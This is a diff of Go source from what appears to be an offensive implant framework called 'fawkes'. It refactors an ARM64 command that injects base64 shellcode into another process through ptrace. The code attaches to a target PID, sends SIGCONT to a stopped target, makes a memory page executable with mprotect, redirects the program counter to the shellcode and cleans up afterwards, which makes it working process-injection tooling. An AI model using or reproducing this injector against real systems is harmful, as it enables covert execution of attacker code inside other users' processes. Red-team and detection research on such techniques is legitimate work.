@@ -3,31 +3,14 @@
 package commands
 
 import (
-	"encoding/base64"
 	"fmt"
 	"os"
 	"runtime"
 	"strings"
 	"syscall"
-	"time"
 
 	"fawkes/pkg/structs"
 )
-
-type PtraceInjectCommand struct{}
-
-func (c *PtraceInjectCommand) Name() string { return "ptrace-inject" }
-func (c *PtraceInjectCommand) Description() string {
-	return "Linux process injection via ptrace syscall (T1055.008)"
-}
-
-type ptraceInjectArgs struct {
-	Action       string `json:"action"`
-	PID          int    `json:"pid"`
-	ShellcodeB64 string `json:"shellcode_b64"`
-	Restore      *bool  `json:"restore"`
-	Timeout      int    `json:"timeout"`
-}
 
 func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
@@ -69,31 +52,9 @@ func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
 }
 
 func ptraceInjectArm64(args ptraceInjectArgs) structs.CommandResult {
-	if args.PID <= 0 {
-		return errorResult("Error: valid pid required")
-	}
-
-	if args.ShellcodeB64 == "" {
-		return errorResult("Error: shellcode_b64 required (base64-encoded shellcode)")
-	}
-
-	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
+	shellcode, restore, timeout, err := ptraceValidateAndDecode(args)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
-	}
-
-	if len(shellcode) == 0 {
-		return errorResult("Error: shellcode is empty")
-	}
-
-	restore := true
-	if args.Restore != nil {
-		restore = *args.Restore
-	}
-
-	timeout := args.Timeout
-	if timeout <= 0 {
-		timeout = 30
+		return errorf("Error: %v", err)
 	}
 
 	var sb strings.Builder
@@ -102,27 +63,16 @@ func ptraceInjectArm64(args ptraceInjectArgs) structs.CommandResult {
 	sb.WriteString(fmt.Sprintf("[*] Restore: %v\n", restore))
 	sb.WriteString("[*] Architecture: ARM64\n")
 
-	if _, err := os.Stat(fmt.Sprintf("/proc/%d", args.PID)); err != nil {
-		return errorResult(sb.String() + fmt.Sprintf("[!] Process %d not found\n", args.PID))
+	if err := ptraceCheckProcess(args.PID); err != nil {
+		return errorResult(sb.String() + fmt.Sprintf("[!] %v\n", err))
 	}
 
-	// Check Yama scope before ptrace attempt
-	scope, hint := checkYamaScope()
+	scope, yamaHint := checkYamaScope()
 	if scope >= 1 && os.Geteuid() != 0 {
-		sb.WriteString(fmt.Sprintf("[!] %s\n", hint))
+		sb.WriteString(fmt.Sprintf("[!] %s\n", yamaHint))
 	}
 
-	// Send SIGCONT if target is in group-stop
-	if statusData, readErr := os.ReadFile(fmt.Sprintf("/proc/%d/status", args.PID)); readErr == nil {
-		for _, line := range strings.Split(string(statusData), "\n") {
-			if strings.HasPrefix(line, "State:") && strings.Contains(line, "stopped") {
-				_ = syscall.Kill(args.PID, syscall.SIGCONT)
-				time.Sleep(10 * time.Millisecond)
-				sb.WriteString("[*] Target was stopped — sent SIGCONT before attach\n")
-				break
-			}
-		}
-	}
+	ptraceSendSIGCONTIfStopped(args.PID, &sb)
 
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
@@ -130,7 +80,7 @@ func ptraceInjectArm64(args ptraceInjectArgs) structs.CommandResult {
 	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", args.PID))
 	if err := syscall.PtraceAttach(args.PID); err != nil {
 		if err == syscall.EPERM && scope >= 1 {
-			return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n[!] %s\n", err, hint))
+			return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n[!] %s\n", err, yamaHint))
 		}
 		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err))
 	}
@@ -200,11 +150,7 @@ func ptraceInjectArm64(args ptraceInjectArgs) structs.CommandResult {
 		_ = syscall.PtraceDetach(args.PID)
 		return errorResult(sb.String() + fmt.Sprintf("[!] mprotect syscall failed: %v\n", err))
 	}
-	if mprotectRet != 0 {
-		sb.WriteString(fmt.Sprintf("[!] mprotect returned %d (non-zero), continuing anyway\n", int64(mprotectRet)))
-	} else {
-		sb.WriteString("[+] mprotect: page now PROT_READ|PROT_EXEC\n")
-	}
+	ptraceMprotectCheck(mprotectRet, &sb)
 
 	newRegs := origRegs
 	newRegs.Pc = rwAddr
@@ -223,35 +169,12 @@ func ptraceInjectArm64(args ptraceInjectArgs) structs.CommandResult {
 	}
 
 	if restore {
-		deadline := time.Now().Add(time.Duration(timeout) * time.Second)
-		stopped := false
-		for time.Now().Before(deadline) {
-			wpid, err := syscall.Wait4(args.PID, &ws, syscall.WNOHANG, nil)
-			if err != nil {
-				sb.WriteString(fmt.Sprintf("[!] Wait4 error: %v\n", err))
-				break
-			}
-			if wpid > 0 {
-				stopped = true
-				break
-			}
-			time.Sleep(50 * time.Millisecond)
-		}
-
-		if !stopped {
-			sb.WriteString(fmt.Sprintf("[!] Timeout after %ds waiting for shellcode completion\n", timeout))
-			sb.WriteString("[*] Detaching without restore (shellcode may still be running)\n")
+		stopped, ws := ptraceWaitForShellcode(args.PID, timeout, &sb)
+		if !ptraceReportCompletion(stopped, ws, timeout, &sb) {
 			_ = syscall.PtraceDetach(args.PID)
 			return successResult(sb.String())
 		}
 
-		if ws.StopSignal() == syscall.SIGTRAP {
-			sb.WriteString("[+] Shellcode completed (SIGTRAP received)\n")
-		} else {
-			sb.WriteString(fmt.Sprintf("[*] Process stopped with signal %d\n", ws.StopSignal()))
-		}
-
-		// Clean up allocated memory via munmap(215)
 		munmapRegs := origRegs
 		munmapRegs.Pc = svcAddr
 		munmapRegs.Regs[8] = arm64SysMunmap
@@ -271,13 +194,6 @@ func ptraceInjectArm64(args ptraceInjectArgs) structs.CommandResult {
 		}
 	}
 
-	if err := syscall.PtraceDetach(args.PID); err != nil {
-		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
-	} else {
-		sb.WriteString("[+] Detached from process\n")
-	}
-
-	sb.WriteString("[+] Ptrace injection completed successfully\n")
-
+	ptraceDetachAndFinalize(args.PID, &sb)
 	return successResult(sb.String())
 }
